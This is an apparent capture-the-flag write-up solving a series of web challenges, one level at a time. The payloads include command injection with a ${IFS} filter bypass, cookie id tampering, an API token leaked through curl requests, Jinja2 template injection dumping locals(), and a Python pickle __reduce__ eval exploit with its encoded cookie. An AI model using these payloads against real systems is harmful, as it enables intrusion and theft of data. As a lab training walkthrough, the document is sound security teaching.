# WE01

```
Access the site at https://ggcs-we01.allyourbases.co and see if you can find the flag in a common directory.
Hint: Think about places you could get a list of common directories to check for.
```

I decided to run dirb on the webpage to see if I could find anything.


![Dirb results](/images/WE01.png)

After a load of 403s, we can see 3 pages that don't yield a 403, which are index.html, soap and sample.
index.html simply gives the original page, so that was quite useless.
soap appears to be blank, so we skip it too.
However if we go to /sample, we can see a file called flag.txt, which we can then visit to get the flag.
https://ggcs-we01.allyourbases.co/sample/flag.txt
![Flag!](/images/WE01a.png)

Flag: bustING_direTORies_8918

# WE02
```
Access the site at https://ggcs-we02.allyourbases.co and see if you can find the flag on the site.
```

The website hints at viewing the source, so we do so

![Viewing the source](/images/WE02.png)

We can see an interesting Javascript page which is "/component---src-pages-else-js-b41975d5a1f03391fee1.js"
Therefore, we go visit it at https://ggcs-we02.allyourbases.co/component---src-pages-else-js-b41975d5a1f03391fee1.js

Visiting it, we can see the flag in the code.
![Flag!](/images/WE02a.png)

Flag: webPACkEd-AlRiGHT_7182

# WE03
```
Access the site at https://ggcs-we03.allyourbases.co and find a secret page which contains the flag.
```

Visiting the page, nothing seems to pop out at first, so I read the briefing again.
It mentions a secret page, so my initial thought is to go to robots.txt, as there are often secret pages there.

![robots.txt](/images/WE03.png)

As we can see, there is a hidden page called /61829201829023.html
Therefore, we can visit this page at https://ggcs-we03.allyourbases.co/61829201829023.html and see what we can find.
And as it says in the briefing, the flag is right there!

![Flag!](/images/WE03a.png)

Flag: NO_CrAwLing_Plz_0192

# WE04
```
Visit the news site at https://ggcs-we04.allyourbases.co and see if you can find a way to access the article without subscribing.
```

Nothing appears to pop out, so we look at the source code. 
![Source code](/images/WE04.PNG)
We can see that there is an interesting HTML comment:
```
<!--TODO: SEO is important to us, particularly Google's results are important!-->
```
The headline also hints at robots. 
If we do a quick google search for Google and robots, we can see something called Googlebot.
Right now the user agent is Applebot, so perhaps we need to change it to Googlebot?
And sure enough, the flag was indeed there when I changed the user agent.
![Changing the user agent](/images/WE04a.png)
![Flag!](/images/WE04b.PNG)

Flag: CrawlING-So-SlOwLY-8199

# WM01
```
Access the site at https://ggcs-wm01.allyourbases.co and find and then read the contents of the flag file to get the flag.
```
We appear to just have a linux file system, where we choose a path and then it will perform the ls command.
Perhaps then, we can use command injection, for example appending && and adding your command at the end.
![Command injection worked!](/images/WM01.PNG)
So then we can try and find this file.
After trying to find the file in many different directories, I decided to try and find it in the directory where we were, and sure enough, if we did `ls -a`, we could see a file called `.flag.txt`.
![Found the file!](/images/WM01a.PNG)
We then just do `cat .flag.txt` to get the flag!
![Flag!](/images/WM01b.png)

Flag: unSAFE_eXecution_42

# WM02
```
Visit the site at https://ggcs-wm02.allyourbases.co and find a way to log into the admin user without guessing a password.

Note: You can log in as a regular user with the username: linus and the password: torvalds
```
We can log in with these credentials, but it appears to just give us a blank page telling us we have logged in.
![Logged in?](/images/WM02.png)

It appears that when we log in, a cookie is set.
![Cookie!](/images/WM02a.png)

There is an id parameter, and then the data, which contains the name.
Perhaps we can bruteforce this id parameter and then try and log in as a new user.
I ended up doing this manually because I wasn't able to get my script to work, and get the value as 33.
So simply setting the cookie to {"id": 33} will log you in as "james", and then get you the flag!

Flag: IncREMentaLl_SessIoNs-1920

# WM03
```
Visit the site at https://ggcs-wm03.allyourbases.co and investigate the API that serves the page to find a way to get the flag.
```
We can refresh the page and see that the JSON object of`{getUser: 1}` is being sent.
![Stuff being sent](/images/WM03.png)

After trying to mess around with the value, which didn't give any results, I tried messing around with the actual function.
If I changed the getUser to something random, I got a weird result:
`curl -X POST https://oo5apsmnc8.execute-api.eu-west-1.amazonaws.com/stag/wm03 -d '{"a":"1"}'`

![owo what's this!](/images/WM03a.png)

We seem to have been able to get the list of valid keys, and there's one that is `getFlag`! So we should be able to get the flag right?
`curl -X POST https://oo5apsmnc8.execute-api.eu-west-1.amazonaws.com/stag/wm03 -d '{"getFlag":"1"}'`

![No flag :(](/images/WM03b.png)

It seems we need an api token to use this.
There is another key called `config`, let's see what we can get out of that.
`curl -X POST https://oo5apsmnc8.execute-api.eu-west-1.amazonaws.com/stag/wm03 -d '{"config":"1"}'`

![ooo an api token!](/images/WM03c.png)

And it looks like we were able to get the api token!
So now we can get the flag with `getFlag` by just adding the parameter `{"api_token": "supersecret31337apitoken"}`
`curl -X POST https://oo5apsmnc8.execute-api.eu-west-1.amazonaws.com/stag/wm03 -d '{"getFlag":"1", "api_token": "supersecret31337apitoken"}'`

![Finally! Flag!](/images/WM03d.png)

And there we can see the flag in the result.
Flag: LAx_AUThEntiCaTION-:(

# WH01
```
Access the site at https://ggcs-wh01.allyourbases.co and find and then read the contents of the flag file to get the flag.
```
We can see that this appears to be a sequel to the command injection challenge.
After a bit of experimentation, I was able to get command execution, but we cannot use spaces, or else the filter will not allow us to inject the command.
![Command execution](/images/WH01.png)

So this just became a challenge of trying to do bash commands without using spaces.
I was able to get around this by replacing spaces with ${IFS}, and that worked!
If we then do `&&ls${IFS}-a`, we can see the ... dir, which is not standard, therefore we should look into it further.
![Found the dir!](/images/WH01a.png)

We can then do `&&ls${IFS}-a${IFS}...` to look inside it to see the `.flag.txt` file once again
![Found the file!](/images/WH01b.png)

Therefore, we can simply just use `&&cat${IFS}.../.flag.txt` to see the flag.
![Flag!](/images/WH01c.png)

Flag: SCUffeD_FiLTERing_1000

# WH02
```
Visit the site at https://ggcs-wh02.allyourbases.co and see if you can find a way to get the flag.
```

After visiting the site, nothing seems to pop out at us immediately.
The title of the page seems interesting, it feels like it wants us to get lost.
![Nothing... interesting?](/images/WH02.png)

More specifically, it wants us to get a 404 Not Found.
After a lot of experimentation, I figured out that the template was Jinja2, which could be vulnerable to SSTI, or Server-Side Template Injection.
I was able to test this by going to `https://ggcs-wh02.allyourbases.co/{{ 1 + 1}}`, which if it is vulnerable, we should get a result as 2.
![We got SSTI!](/images/WH02a.png)

And sure enough, we were able to get that.
This means that we can do a bit of experimentation with this.
After a lot more experimentation, I was able to dumb the local variables with {{ locals() }}, we can see a strange looking variable called `laksnd8quoqjknadaklsd9aodu892ja`, and we can see that its value is the flag!
![Flag in the variable!](/images/WH02b.png)

Flag: tEmPlATes-R-FuNN-2391

# WH03
```
Visit the site at https://ggcs-wh03.allyourbases.co and see if you can find a way to get the flag.
```
The page seems to be empty at first.
If we view source, we can see a large chunk of Javascript code, and suprisingly, it seems it wants us to deobsfuscate this!
![That's... a lot of code.](/images/WH03.png)

We can pop it into JSNICE and then deobsfuscate it.
![Deobsfuscated.](/images/WH03a.png)

We can then check out where it would print the flag. 
The final point where it prints flag is where it prints 
`"Flag: " + key;`
![Important code](/images/WH03b.png)

Therefore, we need to work out what key is.
Key appears to be calculated a few lines above this, and so we can just take the code that calculates `key` and paste it into the console to run it.
```
var key = "";
/** @type {number} */
i = 0;
for (; i < h[b("0x23", "yOrU")]; i++) {
  key = key + h[i] + r[i];
}
```

And then the flag will appear as the output in the console.

![Flag!](/images/WH03c.png)

Flag: rANDom_VICTORy_113

# WX01
```
Visit the site at https://ggcs-wx01.allyourbases.co and find a way to get the flag.

There's a variable called 'flag' but good luck getting to it! This is a super serious challenge.
```
The website hints at some serialization it seems.
We can see a cookie when once we submit, and it appears to be in pickle format.
So, we see what we can do with that.
There is a method with pickling called `__reduce__`, which gets called when it is pickled. This method is able to hold a tuple which contains instructions for unpickling.
This method takes a command and then its arguments, so `(command(arg1,arg2))`
However, we want to get the variable flag, so we can replace this with something like `return dict({'name':flag})`
The problem is however, not everything is executed on the remote, where we want it to execute, as we want to get the value of flag on the remote.
So simply doing `dict({'name':flag})` won't work, as flag is evaluated locally, which is not what we want.
We can then try using `eval()`, as eval has access to the same things as the code it is in, which means we should be able to access the flag variable if we can get `return (eval, ("dict({'name':flag})",))` to execute remotely.
We do this by defining a class, where we place our payload to get the flag remotely, as the class will be constructed remotely.
```
import pickle
import codecs
class thing(object):
        def __reduce__(self):
                return (eval, ("dict({'name':flag})",))

pickled = codecs.encode(pickle.dumps(thing()), "base64").decode()

print(pickled)
```
This gives us the `userdata` variable we need to send to get the flag
`curl -X POST https://oo5apsmnc8.execute-api.eu-west-1.amazonaws.com/stag/wx01 -d '{"userdata":"Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMiZGljdCh7J25hbWUnOmZsYWd9KSIKcDEKdHAyClJwMwou"}'
`
![Flag.](/images/WX01.png)

Flag: suPER_SeRiAL-bR0_02891
